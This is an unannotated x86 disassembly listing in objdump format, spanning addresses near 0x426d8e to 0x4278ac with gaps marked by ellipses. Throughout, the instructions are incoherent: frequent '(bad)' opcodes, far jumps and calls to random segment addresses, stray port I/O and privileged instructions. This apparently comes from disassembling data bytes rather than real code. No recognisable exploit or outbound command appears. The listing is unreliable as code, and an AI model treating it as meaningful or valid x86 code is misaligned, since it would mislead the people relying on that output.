  426d8e:	xor    edx,DWORD PTR [edi]
	...
  426df4:	or     dh,BYTE PTR [ecx-0xc040c9f]
  426dfa:	call   0x870c:0xc7c2ecf9
  426e01:	loope  0x426e36
  426e03:	jne    0x426e09
  426e05:	lahf   
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	jp     0x426e5a
  426e0e:	fld    DWORD PTR [esi-0x1c]
  426e11:	cmp    cl,ch
  426e13:	leave  
  426e14:	sbb    BYTE PTR [ecx],0xd6
  426e17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426e18:	push   ebx
  426e19:	pop    edx
  426e1a:	and    dh,BYTE PTR [ebp+0x49aa22bc]
  426e20:	cmp    esi,eax
  426e22:	nop
  426e23:	std    
  426e24:	jmp    0xe0b9:0xe517f0ea
  426e2b:	cmp    ch,BYTE PTR [esi-0x42ac737f]
  426e31:	dec    edx
  426e32:	sti    
  426e33:	dec    ecx
  426e34:	sbb    DWORD PTR [ebx+ecx*1+0x66d53ec9],0xb
  426e3c:	pop    ebx
  426e3d:	(bad)  
  426e3e:	mov    eax,gs:0x502f2732
  426e44:	cmp    BYTE PTR [edx+0x742af458],dh
  426e4a:	ins    DWORD PTR es:[edi],dx
  426e4b:	fwait
  426e4c:	pop    esi
  426e4d:	popa   
  426e4e:	inc    ebx
  426e4f:	inc    esp
  426e50:	inc    edi
  426e51:	jge    0x426e02
  426e53:	dec    ebp
  426e54:	sbb    esp,edx
  426e56:	xor    edi,eax
  426e58:	inc    edx
  426e59:	sbb    al,0x90
  426e5b:	push   ecx
  426e5c:	hlt    
  426e5d:	and    DWORD PTR [edx+eiz*4+0x60232b70],esi
  426e64:	test   BYTE PTR [ecx-0x36],0x14
  426e68:	test   al,0x70
  426e6a:	jmp    FWORD PTR [edi]
  426e6c:	adc    BYTE PTR [ebp+esi*1-0x47f6b1b5],ah
  426e73:	mov    eax,0xa3ba420c
  426e78:	mov    esi,0xf5c8db00
  426e7d:	mov    bl,BYTE PTR ds:0xf3e411b7
  426e83:	mov    bl,0xd7
  426e85:	jbe    0x426e57
  426e87:	mov    ecx,0xdb2ec423
  426e8c:	inc    ebx
  426e8d:	sbb    BYTE PTR [esi-0x2f],bl
  426e90:	js     0x426e54
  426e92:	cmp    al,0xa3
  426e94:	in     eax,0x23
  426e96:	adc    esp,DWORD PTR [edi+0xcc0f168]
  426e9c:	mov    al,0x35
  426e9e:	and    DWORD PTR [ebx+0x55435ec1],edx
  426ea4:	cs push esi
  426ea6:	cld    
  426ea7:	xchg   edx,eax
  426ea8:	data16 je 0x426f20
  426eab:	hlt    
  426eac:	sbb    al,0x1f
  426eae:	(bad)  
  426eaf:	fnstsw WORD PTR [esi-0x32]
  426eb2:	adc    BYTE PTR [ebx],ah
  426eb4:	aas    
  426eb5:	or     DWORD PTR [esp+edi*4],ebp
  426eb8:	es mov ebx,0x49ab0713
  426ebe:	dec    ebx
  426ebf:	cwde   
  426ec0:	and    DWORD PTR [esi+0x1f4b9768],0x8603414d
  426eca:	(bad)  
  426ecb:	(bad)  
  426ecd:	ja     0x426f0d
  426ecf:	pop    ebx
  426ed0:	sbb    al,0x10
  426ed2:	dec    edx
  426ed3:	call   0xb15a:0x763f3010
  426eda:	xchg   ebp,eax
  426edb:	pop    ebp
  426edc:	cmp    edi,esp
  426ede:	mov    esp,0x47f7cf3
  426ee3:	pop    esi
  426ee4:	jp     0x426f42
  426ee6:	dec    esp
  426ee7:	jmp    0x426f1a
  426ee9:	mov    ecx,0x7f1e3c40
  426eee:	aas    
  426eef:	rcl    DWORD PTR [eax+edx*8],cl
  426ef2:	xor    DWORD PTR [ecx],esi
  426ef4:	cld    
  426ef5:	jp     0x426e7a
  426ef7:	jno    0x426ea4
  426ef9:	mov    BYTE PTR [ebx+ebp*8],bh
  426efc:	add    BYTE PTR [ecx-0x2b],0x2d
  426f00:	jns    0x426f36
  426f02:	das    
  426f03:	test   eax,0x5952416d
  426f08:	cmc    
  426f09:	mov    bh,bh
  426f0b:	xlat   BYTE PTR ds:[ebx]
  426f0c:	cdq    
  426f0d:	pop    eax
  426f0e:	inc    eax
  426f0f:	test   BYTE PTR [eax],0x0
	...
  426f72:	add    BYTE PTR [eax],al
  426f74:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426f75:	mov    ds:0xf5c7f1c7,al
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [ecx+eiz*2+0x8fedb03],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	sub    DWORD PTR [ecx-0x7acf5729],esp
  426f92:	outs   dx,DWORD PTR ds:[esi]
  426f93:	retf   
  426f94:	push   ds
  426f95:	faddp  st(3),st
  426f97:	inc    esp
  426f98:	jns    0x426f98
  426f9a:	sub    al,0x81
  426f9c:	or     DWORD PTR [edx-0x2db77c1f],ebx
  426fa2:	in     eax,0x4e
  426fa4:	push   esi
  426fa5:	adc    DWORD PTR [eax+0x3fdd55dc],0x58
  426fac:	sub    eax,0xf62699cd
  426fb1:	xor    dl,al
  426fb3:	inc    ecx
  426fb4:	mov    edi,0x1c8ffef8
  426fb9:	(bad)  
  426fba:	or     al,bh
  426fbc:	into   
  426fbd:	sar    DWORD PTR [eax+edi*2-0x2855cde7],1
  426fc4:	add    DWORD PTR [eax+0x5cbbf7af],esp
  426fca:	call   0x8bdfef5
  426fcf:	push   esi
  426fd0:	pop    es
  426fd1:	retf   0x1696
  426fd4:	and    BYTE PTR [esi-0x37],bl
  426fd7:	jp     0x427043
  426fd9:	je     0x426fe6
  426fdb:	inc    ebp
  426fdc:	ins    DWORD PTR es:[edi],dx
  426fdd:	dec    edx
  426fde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426fdf:	dec    esp
  426fe0:	imul   ecx,edi,0xffffff90
  426fe3:	aad    0x11
  426fe5:	fcom   QWORD PTR [edx+0x2]
  426fe8:	push   edx
  426fe9:	jp     0x426f9b
  426feb:	xchg   BYTE PTR [esi],cl
  426fed:	cdq    
  426fee:	sar    dh,cl
  426ff0:	fwait
  426ff1:	mov    esi,0xedfd80cb
  426ff6:	cmc    
  426ff7:	(bad)  
  426ff9:	jmp    0xb3c4:0xe7a4cc57
  427000:	imul   edx,DWORD PTR [edx-0x9c90ede],0xffffffdd
  427007:	jae    0x42707c
  427009:	dec    eax
  42700a:	(bad)  
  42700c:	ins    BYTE PTR es:[edi],dx
  42700d:	fs jns 0x427055
  427010:	mov    cl,0xfb
  427012:	mov    DWORD PTR [edi-0x538520c0],esi
  427018:	gs push ecx
  42701a:	cmp    esp,ebp
  42701c:	enter  0xc6c5,0xf9
  427020:	xchg   ecx,eax
  427021:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427022:	jmp    0x42703c
  427024:	add    eax,0xbdcb5a0e
  427029:	xchg   BYTE PTR [eax-0x80],ah
  42702c:	push   eax
  42702d:	dec    edx
  42702e:	rol    ah,1
  427030:	ins    BYTE PTR es:[edi],dx
  427031:	test   BYTE PTR [edx+ebx*8+0x523eceb2],0x99
  427039:	imul   DWORD PTR [eax+0x40a6af05]
  42703f:	push   ebp
  427040:	or     BYTE PTR [ecx+ebx*8+0x595aa85a],bl
  427047:	test   ecx,edx
  427049:	out    0x13,eax
  42704b:	inc    ebp
  42704c:	sub    BYTE PTR [edx],bl
  42704e:	ret    
  42704f:	xor    edx,ebp
  427051:	daa    
  427052:	call   0x5a58fb67
  427057:	pop    ss
  427058:	or     esp,DWORD PTR [ecx+0x2b6a9c29]
  42705e:	mov    ch,0x19
  427060:	xchg   edx,eax
  427061:	xor    dl,BYTE PTR [ebx-0x3fff5463]
  427067:	js     0x426ff3
  427069:	jne    0x4270e2
  42706b:	fs inc edx
  42706d:	or     al,0x25
  42706f:	imul   ecx,DWORD PTR [ebx],0x6b
  427072:	sub    ch,BYTE PTR [eax+edx*8]
  427075:	ficom  DWORD PTR [eax]
  427077:	fisub  DWORD PTR [edi-0x2f]
  42707a:	xchg   edi,eax
  42707b:	sub    al,0xb8
  42707d:	out    0x6d,eax
  42707f:	xchg   BYTE PTR [esi-0xc26bf2a],ch
  427085:	pop    es
  427086:	in     eax,dx
  427087:	add    eax,0x231d27db
  42708c:	or     esp,0xffffffe3
  42708f:	rol    DWORD PTR [eax],cl
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0x74aa9d96
  427102:	sub    bl,BYTE PTR [ecx+0x1a10c]
  427108:	add    al,0x1
  42710a:	add    BYTE PTR [eax],al
  42710c:	mov    ah,0x1c
  42710e:	cld    
  42710f:	xor    BYTE PTR [eax],dl
  427111:	adc    sp,WORD PTR [eax+ebp*2-0x3a]
  427116:	(bad)  
  427117:	adc    al,0x76
  427119:	pop    edx
  42711a:	dec    edx
  42711b:	int3   
  42711c:	and    bh,BYTE PTR [esp+ebp*2+0x224560f9]
  427123:	mov    ds:0x4a8a5cfd,eax
  427128:	push   0xffffffec
  42712a:	aam    0xe2
  42712c:	sbb    DWORD PTR [edx-0x70],edi
  42712f:	push   0x25
  427131:	shr    DWORD PTR [esi],1
  427133:	mov    esi,0xbcd2cb73
  427138:	(bad)  
  427139:	xchg   ebx,eax
  42713a:	mov    esi,edi
  42713c:	xchg   edx,eax
  42713d:	inc    eax
  42713e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42713f:	repz mov cl,0xe6
  427142:	inc    ebp
  427143:	xor    BYTE PTR [edi+0x8a9e224],bl
  427149:	jnp    0x4270f2
  42714b:	mov    cl,0x6c
  42714d:	dec    esp
  42714e:	mov    esp,0x42fda9a0
  427153:	sbb    BYTE PTR [edi-0x45f15389],0xdc
  42715a:	sbb    dl,bl
  42715c:	test   al,0x33
  42715e:	jmp    0x929ad47b
  427163:	je     0x42718e
  427165:	(bad)  
  427166:	stc    
  427167:	pushf  
  427168:	inc    ebx
  427169:	push   eax
  42716a:	cs jae 0x42717a
  42716d:	mov    ebx,0x668216c4
  427172:	pop    eax
  427173:	mov    edx,0x1dca6b8a
  427178:	call   0x5e99:0x5a1b88d3
  42717f:	call   0xe00a2e1e
  427184:	sub    al,0x68
  427186:	push   0x2e80b07e
  42718b:	dec    esp
  42718c:	add    eax,edi
  42718e:	lea    ecx,[edx+0x3fd0a856]
  427194:	mov    edx,0x88294219
  427199:	in     al,0x4d
  42719b:	jae    0x4271dc
  42719d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42719e:	jnp    0x427129
  4271a0:	inc    edx
  4271a1:	enter  0x3557,0x5d
  4271a5:	ror    DWORD PTR [ebp-0x58614a08],0xea
  4271ac:	xchg   ebp,eax
  4271ad:	loope  0x4271c3
  4271af:	xchg   esi,eax
  4271b0:	mov    dh,0x7d
  4271b2:	or     al,ch
  4271b4:	jp     0x4271d8
  4271b6:	cld    
  4271b7:	das    
  4271b8:	mov    WORD PTR [ebp-0x6e],es
  4271bb:	loop   0x427149
  4271bd:	xchg   DWORD PTR [eax-0xe68e9ee],eax
  4271c3:	mul    edi
  4271c5:	sub    ch,BYTE PTR [edx-0x7de33779]
  4271cb:	sbb    esp,0x2f4be065
  4271d1:	retf   0xafc6
  4271d4:	or     esi,DWORD PTR [ebx+0x72cd2e59]
  4271da:	stos   DWORD PTR es:[edi],eax
  4271db:	loope  0x42721d
  4271dd:	es push ss
  4271df:	cmc    
  4271e0:	adc    dh,BYTE PTR [edi-0x2]
  4271e3:	and    BYTE PTR [edx],bl
  4271e5:	dec    ebp
  4271e6:	mov    WORD PTR ss:[edi-0x48b5407b],cs
  4271ed:	xchg   ecx,eax
  4271ee:	mov    bh,0x8b
  4271f0:	push   0x13fc72a8
  4271f5:	sub    eax,0x4eafad6
  4271fa:	ror    bl,cl
  4271fc:	xchg   esp,eax
  4271fd:	retf   
  4271fe:	sub    al,BYTE PTR [ebx+0x16]
  427201:	sahf   
  427202:	jle    0x427244
  427204:	push   eax
  427205:	jmp    0x9d6e:0x5c804ec2
  42720c:	mov    ebp,0x19dd9f
	...
  427271:	add    BYTE PTR [eax],al
  427273:	add    BYTE PTR [esi],bl
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x14cb8c27,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	inc    eax
  42728d:	mov    esp,0xb4be32c4
  427292:	add    al,0xb0
  427294:	not    BYTE PTR [ebp-0x4f]
  427297:	pusha  
  427298:	cli    
  427299:	mov    cs,WORD PTR [ecx-0x117ed9a4]
  42729f:	mov    dl,0x1d
  4272a1:	imul   esi,DWORD PTR [ebx+ebx*1],0xffffffa9
  4272a5:	test   BYTE PTR [edx],al
  4272a7:	mov    DWORD PTR [esi],0xafecf9f3
  4272ad:	mov    ch,0x98
  4272af:	pop    eax
  4272b0:	jl     0x427324
  4272b2:	fldcw  WORD PTR [ecx]
  4272b4:	sar    BYTE PTR [ebx],cl
  4272b6:	call   0x95f5:0x2119e100
  4272bd:	dec    esi
  4272be:	dec    eax
  4272bf:	fnstcw WORD PTR ds:0x9234f043
  4272c5:	retf   0xf15f
  4272c8:	popa   
  4272c9:	xor    bh,BYTE PTR [edx+0x3cacb80b]
  4272cf:	sahf   
  4272d0:	scas   eax,DWORD PTR es:[edi]
  4272d1:	push   0x98ca382e
  4272d6:	jl     0x4272dd
  4272d8:	test   al,0xdd
  4272da:	mov    ebp,0xa81bab8f
  4272df:	pushf  
  4272e0:	outs   dx,BYTE PTR ds:[esi]
  4272e1:	popf   
  4272e2:	adc    bl,BYTE PTR [esi+0x65]
  4272e5:	lods   al,BYTE PTR ds:[esi]
  4272e6:	ja     0x4272b3
  4272e8:	jmp    0x8edf050f
  4272ed:	mov    al,ds:0x8b4771cd
  4272f2:	mov    esi,DWORD PTR [ebx-0x41803e69]
  4272f8:	fs mov dh,0xac
  4272fb:	adc    DWORD PTR [eax+ebp*4],0x2a
  4272ff:	mov    esi,0x5e59c40e
  427304:	xor    al,0x4d
  427306:	add    dh,al
  427308:	div    DWORD PTR [ebx+0x220e2d9a]
  42730e:	xchg   ebx,eax
  42730f:	repz call 0x27b0:0xb7444169
  427317:	xchg   DWORD PTR [esi],ebp
  427319:	jbe    0x4272e9
  42731b:	mov    ss,WORD PTR [ebx-0x2a1fdb5e]
  427321:	in     al,0x70
  427323:	push   esp
  427324:	inc    ebx
  427325:	xor    eax,0xb206e283
  42732a:	mov    esp,0x78799549
  42732f:	imul   esi,ebx,0x2f
  427332:	fist   WORD PTR [edx+0x141e76ae]
  427338:	pop    esp
  427339:	in     al,0x1d
  42733b:	out    dx,al
  42733c:	mov    eax,ds:0xd6937307
  427341:	out    dx,eax
  427342:	sbb    eax,0x1b08bfc0
  427347:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427348:	nop
  427349:	add    eax,edx
  42734b:	push   esp
  42734c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42734d:	test   DWORD PTR [esi+edx*1+0x7c65ddac],edi
  427354:	push   ecx
  427355:	das    
  427356:	test   DWORD PTR [edi+0x62],eax
  427359:	(bad)  
  42735a:	mov    al,ds:0x8f39fad3
  42735f:	pusha  
  427360:	xchg   ebx,eax
  427361:	cmp    edi,DWORD PTR [ebx]
  427363:	mov    esi,0x85e1e80e
  427368:	sbb    ah,ah
  42736a:	cdq    
  42736b:	adc    ah,BYTE PTR [edx+0x38]
  42736e:	(bad)  
  42736f:	fld    QWORD PTR [ebp+0x3a]
  427372:	and    esp,DWORD PTR [ebx]
  427374:	lds    eax,FWORD PTR [edi-0x3]
  427377:	or     eax,0x24cf9e54
  42737c:	sbb    BYTE PTR [ecx+0x5b],cl
  42737f:	inc    DWORD PTR [edi]
  427381:	sahf   
  427382:	xor    DWORD PTR [ecx],eax
  427384:	add    al,0x6e
  427386:	mov    al,0xca
  427388:	test   ebx,ebx
  42738a:	test   al,bl
  42738c:	es ja  0x42734c
  42738f:	push   esp
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    edx,DWORD PTR [edi-0x76]
  427402:	retf   0x14a2
  427405:	mov    ds:0x1040001,eax
  42740a:	add    BYTE PTR [eax],al
  42740c:	sbb    esi,DWORD PTR [ecx-0x15]
  42740f:	push   ebp
  427410:	inc    edi
  427411:	jp     0x4273ad
  427413:	into   
  427414:	std    
  427415:	stos   BYTE PTR es:[edi],al
  427416:	pop    ebx
  427417:	mov    dl,0x46
  427419:	(bad)  
  42741a:	call   0x225365f8
  42741f:	sub    DWORD PTR ds:0x8bea6c9f,esp
  427425:	push   ebx
  427426:	inc    edi
  427427:	aad    0x5f
  427429:	mov    edi,0x9267f7e
  42742e:	push   edx
  42742f:	cld    
  427430:	dec    edi
  427431:	jne    0x427461
  427433:	daa    
  427434:	loope  0x4273d9
  427436:	or     eax,0x3922fe2a
  42743b:	mov    eax,ds:0xa7a4600f
  427440:	inc    edx
  427441:	idiv   BYTE PTR [ecx+0x21898484]
  427447:	jg     0x427425
  427449:	inc    ebx
  42744a:	imul   eax,DWORD PTR [edi],0xffffffa4
  42744d:	pop    edx
  42744e:	dec    esi
  42744f:	jle    0x427460
  427451:	sbb    DWORD PTR [edx+0x70],edx
  427454:	adc    ah,BYTE PTR [eax+0x56e0845f]
  42745a:	sbb    eax,ebp
  42745c:	mov    ecx,0x56cd823
  427461:	stc    
  427462:	jae    0x4274b5
  427464:	mov    bh,0x6f
  427466:	push   0x97a415dc
  42746b:	adc    DWORD PTR [esi],edi
  42746d:	jae    0x4274e4
  42746f:	in     eax,0x6c
  427471:	in     al,dx
  427472:	jle    0x4274a7
  427474:	pop    ebp
  427475:	inc    eax
  427476:	popa   
  427477:	pop    ds
  427478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427479:	cld    
  42747a:	sub    al,0xc4
  42747c:	pop    edi
  42747d:	je     0x4274f4
  42747f:	mov    esi,0xbbd9b344
  427485:	ja     0x42748a
  427487:	(bad)  
  427488:	in     al,dx
  427489:	sub    BYTE PTR [ebx+0x6d],0xf6
  42748d:	jmp    0xc12a:0x98a2750b
  427494:	out    dx,eax
  427495:	(bad)  
  427496:	test   ch,dh
  427498:	repz mov ds:0x3a534cf1,al
  42749e:	xor    eax,0x2419a72b
  4274a3:	pop    ss
  4274a4:	lds    edx,FWORD PTR [ebx+0x5209f14]
  4274aa:	mov    edi,cs
  4274ac:	pop    ecx
  4274ad:	jle    0x427490
  4274af:	add    DWORD PTR [edx+0xf],edi
  4274b2:	(bad)  
  4274b3:	fild   QWORD PTR [ebp+0x2f9b58d5]
  4274b9:	(bad)  
  4274ba:	mov    ecx,0x173f20c1
  4274bf:	retf   0xea3f
  4274c2:	and    eax,0xe9964b3b
  4274c7:	adc    DWORD PTR [ebp+0x79],ebp
  4274ca:	mov    eax,0xf05e9397
  4274cf:	lods   eax,DWORD PTR ds:[esi]
  4274d0:	sti    
  4274d1:	clc    
  4274d2:	and    DWORD PTR [edi-0x65c4809d],eax
  4274d8:	sub    BYTE PTR [ebx-0x394fa412],ah
  4274de:	out    0x7a,eax
  4274e0:	mov    ebx,?
  4274e2:	sub    cl,BYTE PTR [eax+0x6150670]
  4274e8:	lea    esi,[esi-0x17]
  4274eb:	inc    edi
  4274ec:	cmp    BYTE PTR [edi-0x2b5d7c00],al
  4274f2:	ins    DWORD PTR es:[edi],dx
  4274f3:	jb     0x42750b
  4274f5:	push   cs
  4274f6:	outs   dx,DWORD PTR ds:[esi]
  4274f7:	sub    eax,0xea656148
  4274fc:	sbb    BYTE PTR [edx],0x67
  4274ff:	scas   al,BYTE PTR es:[edi]
  427500:	iret   
  427501:	shl    DWORD PTR [ebx-0x53aac0fb],cl
  427507:	and    DWORD PTR [ecx+0x48],esi
  42750a:	dec    edi
  42750b:	retf   
  42750c:	sub    BYTE PTR [ebx],ch
  42750e:	sahf   
  42750f:	mov    edx,0x0
	...
  427574:	pop    esp
  427575:	test   al,0xc0
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	jp     0x427535
  427582:	jb     0x4275bb
  427584:	sbb    BYTE PTR [ecx+eax*1+0x10400],ah
  42758b:	add    ah,bh
  42758d:	loope  0x427552
  42758f:	mov    ebx,0x52267e1c
  427594:	imul   edi,edx,0xffffffbf
  427597:	sbb    al,0xad
  427599:	cmp    ebp,ebp
  42759b:	icebp  
  42759c:	nop
  42759d:	dec    eax
  42759e:	loopne 0x42758d
  4275a0:	mov    ecx,0x5b182012
  4275a5:	xchg   ebp,eax
  4275a6:	xor    edx,DWORD PTR [edx]
  4275a8:	daa    
  4275a9:	stos   DWORD PTR es:[edi],eax
  4275aa:	add    ebp,DWORD PTR [esi-0x4c]
  4275ad:	xor    DWORD PTR ds:0x63bf8116,0xffffffe9
  4275b4:	ret    0x8bd
  4275b7:	ret    
  4275b8:	sub    eax,0x804ede88
  4275bd:	stos   BYTE PTR es:[edi],al
  4275be:	in     al,dx
  4275bf:	or     DWORD PTR [edi+esi*1+0x6334980c],esp
  4275c6:	lds    ebp,FWORD PTR [edi]
  4275c8:	push   cs
  4275c9:	add    eax,0x3f6fe20d
  4275ce:	(bad)  
  4275cf:	repz cwde 
  4275d1:	(bad)  
  4275d2:	sahf   
  4275d3:	cld    
  4275d4:	or     eax,DWORD PTR [ebp+0x22]
  4275d7:	pop    edx
  4275d8:	pushf  
  4275d9:	fcom   DWORD PTR [ebp-0xa271c70]
  4275df:	and    al,0x97
  4275e1:	in     eax,dx
  4275e2:	pop    edx
  4275e3:	jmp    0xbcd5a93d
  4275e8:	push   es
  4275e9:	pop    es
  4275ea:	jl     0x42764a
  4275ec:	test   al,0xfd
  4275ee:	ins    BYTE PTR es:[edi],dx
  4275ef:	ret    0xc41b
  4275f2:	mov    ds:0x991f54f5,eax
  4275f7:	shl    ah,1
  4275f9:	fdiv   QWORD PTR [ebx-0x5931e0bf]
  4275ff:	cmc    
  427600:	dec    esp
  427601:	cs ins DWORD PTR es:[edi],dx
  427603:	dec    edx
  427604:	sbb    edi,DWORD PTR [ebp+0x6e0f8814]
  42760a:	aas    
  42760b:	push   0x37
  42760d:	lock and BYTE PTR [ecx-0x25669593],bh
  427614:	pop    edx
  427615:	ss or  eax,0xfffd10da
  42761b:	adc    bl,ah
  42761d:	repz dec esi
  42761f:	jns    0x4275f2
  427621:	mov    ebp,0x9672e322
  427626:	cld    
  427627:	ja     0x42765b
  427629:	sub    al,0xdb
  42762b:	cmp    dl,ch
  42762d:	xor    bh,cl
  42762f:	in     al,0xf2
  427631:	in     eax,dx
  427632:	dec    edi
  427633:	jnp    0x42765f
  427635:	and    al,0x4b
  427637:	jbe    0x427669
  427639:	sub    eax,0xa0b8b3b
  42763e:	repz xor eax,0x784572b1
  427644:	mov    ecx,0x21b293bb
  427649:	push   ebp
  42764a:	dec    esp
  42764b:	fcmovu st,st(7)
  42764d:	ins    BYTE PTR es:[edi],dx
  42764e:	(bad)  
  42764f:	sahf   
  427650:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427651:	test   bh,bl
  427653:	ret    0xaad3
  427656:	loopne 0x4276bb
  427658:	pop    ecx
  427659:	popa   
  42765a:	jg     0x4276a0
  42765c:	pop    ss
  42765d:	add    ebx,ecx
  42765f:	mov    ds:0x4cbc03f3,al
  427664:	push   ecx
  427665:	add    edx,DWORD PTR [ebx+0x62]
  427668:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427669:	aad    0xb5
  42766b:	adc    eax,0xca832020
  427670:	jnp    0x427661
  427672:	jge    0x42763a
  427674:	mov    bh,0x44
  427676:	add    DWORD PTR [edx+eiz*8+0x6fe2b084],ebp
  42767d:	repnz mov ecx,0x8041926c
  427683:	fnstsw WORD PTR [edi]
  427685:	aaa    
  427686:	imul   esi,DWORD PTR [ebx-0x3ff043f0],0x7a697bf4
	...
  4276f4:	add    DWORD PTR [esi-0x70],edx
  4276f7:	out    dx,al
  4276f8:	xlat   BYTE PTR ds:[ebx]
  4276f9:	out    dx,al
  4276fa:	jg     0x4276fb
  4276fc:	in     al,dx
  4276fd:	xor    al,0x86
  4276ff:	fldenv [ebp+ebp*4-0x5ae34deb]
  427706:	add    DWORD PTR [eax],eax
  427708:	add    al,0x1
  42770a:	add    BYTE PTR [eax],al
  42770c:	icebp  
  42770d:	icebp  
  42770e:	in     eax,0x3
  427710:	and    bl,BYTE PTR [ebp+0x38]
  427713:	push   0x61
  427715:	jmp    0xbcc3:0xed93e7fc
  42771c:	pop    es
  42771d:	mov    DWORD PTR [esp+ebp*1],edx
  427720:	ss push 0xffffff90
  427723:	inc    ebp
  427724:	pop    esp
  427725:	imul   eax,DWORD PTR [ebp+0x8],0x900f9dc
  42772c:	xchg   ebx,eax
  42772d:	les    edi,FWORD PTR [eax]
  42772f:	sbb    edi,DWORD PTR [eax-0x34bc3783]
  427735:	in     eax,0xc7
  427737:	fs inc ebx
  427739:	inc    ebx
  42773a:	pop    ds
  42773b:	cmp    BYTE PTR [edi],cl
  42773d:	add    edi,DWORD PTR [esi-0x14]
  427740:	pop    esi
  427741:	shl    ch,1
  427743:	repz jbe 0x42770b
  427746:	mov    bl,0xc6
  427748:	ficomp DWORD PTR [edi+0x1b]
  42774b:	xor    eax,0x7a9122ad
  427750:	xor    ecx,DWORD PTR [ecx+edi*1-0x51a288a6]
  427757:	adc    bh,al
  427759:	sub    ecx,DWORD PTR [ecx+ebp*4]
  42775c:	(bad)  
  42775d:	jecxz  0x42771f
  42775f:	fild   WORD PTR [ebp-0x5e86fe0b]
  427765:	aam    0x10
  427767:	js     0x427705
  427769:	pop    ebp
  42776a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42776b:	push   ss
  42776c:	fs iret 
  42776e:	xor    al,0xab
  427770:	inc    esi
  427771:	rep lods al,BYTE PTR ds:[esi]
  427773:	or     al,0xb1
  427775:	dec    edi
  427776:	rcl    BYTE PTR ds:0x42f5ee19,1
  42777c:	dec    eax
  42777d:	sub    DWORD PTR [ecx],esp
  42777f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427780:	dec    edi
  427781:	ja     0x4277cb
  427783:	inc    edx
  427784:	sub    eax,0x9c7c3abd
  427789:	xchg   esi,eax
  42778a:	adc    BYTE PTR [ebp+ebx*1-0x16208c69],ch
  427791:	aas    
  427792:	xchg   edx,eax
  427793:	sahf   
  427794:	sbb    BYTE PTR [edx],0x34
  427797:	and    eax,0xa8475e71
  42779c:	fnstcw WORD PTR [ecx*4-0x5255cf67]
  4277a3:	mov    ecx,DWORD PTR [eax-0x42313bdd]
  4277a9:	and    ecx,ebp
  4277ab:	jle    0x427773
  4277ad:	xchg   edx,eax
  4277ae:	sbb    eax,0x1c658505
  4277b3:	test   al,0x69
  4277b5:	rcl    DWORD PTR [esi],cl
  4277b7:	jecxz  0x427827
  4277b9:	xchg   esi,eax
  4277ba:	dec    ecx
  4277bb:	mov    edi,0xf92e25d9
  4277c0:	push   ecx
  4277c1:	in     al,0x6a
  4277c3:	jle    0x42777d
  4277c5:	fnsave [edi+0x2a]
  4277c8:	mul    DWORD PTR [esi-0x49]
  4277cb:	sbb    ebp,ebp
  4277cd:	inc    esp
  4277ce:	push   ebx
  4277cf:	dec    edx
  4277d0:	mov    edi,0xf6b061e7
  4277d5:	sbb    BYTE PTR [eax+eax*4-0x6b84b7db],bh
  4277dc:	mov    WORD PTR [eax-0x7d],ss
  4277df:	popf   
  4277e0:	jne    0x427815
  4277e2:	and    al,0xc0
  4277e4:	dec    ecx
  4277e5:	cld    
  4277e6:	pop    es
  4277e7:	call   0xaa33:0xb7727bc3
  4277ee:	jb     0x4277c3
  4277f0:	cmp    al,0x76
  4277f2:	jmp    0x64cd:0x4dd5c42a
  4277f9:	xor    ecx,DWORD PTR [ebp+0x3d]
  4277fc:	xor    BYTE PTR [edi+0x71],0x56
  427800:	jbe    0x427839
  427802:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427803:	or     al,0xa9
  427805:	fcom   DWORD PTR [eax+0x78]
  427808:	nop
  427809:	lahf   
  42780a:	or     eax,0x8e444fff
  42780f:	sub    BYTE PTR [eax],al
	...
  427871:	add    BYTE PTR [eax],al
  427873:	add    BYTE PTR [edx],bl
  427875:	mov    cl,BYTE PTR [ebx]
  427877:	inc    ebp
  427878:	fwait
  427879:	lds    ebx,FWORD PTR [esi-0x21]
  42787c:	jo     0x4278e3
  42787e:	fldl2e 
  427880:	shr    BYTE PTR [edx-0x59dfa516],0x1
  427887:	add    BYTE PTR [ecx+eax*1],al
  42788a:	add    BYTE PTR [eax],al
  42788c:	jae    0x4278b5
  42788e:	adc    BYTE PTR [ebx],dl
  427890:	les    edi,FWORD PTR [ebx]
  427892:	mov    esp,0x6dc4b250
  427897:	pushf  
  427898:	mov    ds:0x5ae63291,eax
  42789d:	pop    edi
  42789e:	cmp    al,0xe5
  4278a0:	stos   BYTE PTR es:[edi],al
  4278a1:	bound  ebp,QWORD PTR [ebx+0x217e0ea5]
  4278a7:	sbb    al,0x85
  4278a9:	pop    esi
  4278aa:	retf   
  4278ab:	inc    edi
  4278ac:	add    eax,0xe9671e86
